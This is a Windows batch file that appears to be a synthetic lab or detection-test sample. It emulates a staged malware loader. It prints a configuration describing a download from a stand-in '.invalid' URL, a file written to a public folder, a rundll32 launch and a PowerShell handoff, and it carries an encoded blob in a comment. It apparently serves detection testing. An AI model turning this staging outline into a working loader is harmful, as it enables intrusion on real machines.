@echo off
setlocal EnableExtensions EnableDelayedExpansion
rem HUNTRESS-CODEC:split_fragments|add_7
rem HUNTRESS-MATERIAL:fUQ4g3p7bHd6RGhqeHxweWxmeWx0dntsM355cHtsZm1wc2wza3B6d2h7am9md3l2amx6ejNvaHVrdm1tZnpqeXB3e4Noa2h3e2x5RHl8dWtzczo5NWx/bIN6e2hubGZqdnx1e0Q7g255aHdvRHNwdWxoeYN1bH97ZnNodW58aG5sRHd2fmx5em9sc3ODamh0d2hwbnVmcGtEamh0d2hwbnU0Pj8/OmloP2hraoN8eXNEb3t7d3pBNjY+Pz86aWg/aGtqNWx/aHR3c2w1cHV9aHNwazY+aGptamw8OzVraHuDbXBzbGZ3aHtvREpBY1x6bHl6Y1d8aXNwamNPfHV7eWx6elNoaWN6e2hubDQ+Pz86aWg/aGtqNWtoe4N1bH97Znp7aG5sRHp7aG5sND4/PzppaD9oa2o1d3o4
rem HUNTRESS-EXTENSION:cmd
if /i "%~1"=="--inspect" goto :HUNTRESS_INSPECT
if /i "%~1"=="--plan" goto :HUNTRESS_PLAN
exit /b 0
:HUNTRESS_INSPECT
set "h0=v=1|steps=acquire_remote,write_file,dispatch_process,handoff_script|adapter=run"
set "h1=dll32.exe|stage_count=4|graph=linear|next_language=powershell|campaign_id=campa"
set "h2=ign-7883ba8adc|url=https://7883ba8adc.example.invalid/7acfce54.dat|file_path=C:"
set "h3=\Users\Public\HuntressLab\stage-7883ba8adc.dat|next_stage=stage-7883ba8adc.ps1"
goto :HUNTRESS_SEPARATOR_DONE
echo HUNTRESS_SEPARATOR | findstr HUNTRESS >nul
:HUNTRESS_SEPARATOR_DONE
set "neutral_arithmetic=4a7ab835"
set "HUNTRESS_READY=1"
if defined HUNTRESS_READY set "cfg=%h0%%h1%%h2%%h3%"
echo(!cfg!
exit /b 0
:HUNTRESS_UNUSED
goto :HUNTRESS_PLAN
:HUNTRESS_PLAN
echo rundll32.exe acquire, write, dispatch, and hand off stage-7883ba8adc.ps1
exit /b 0
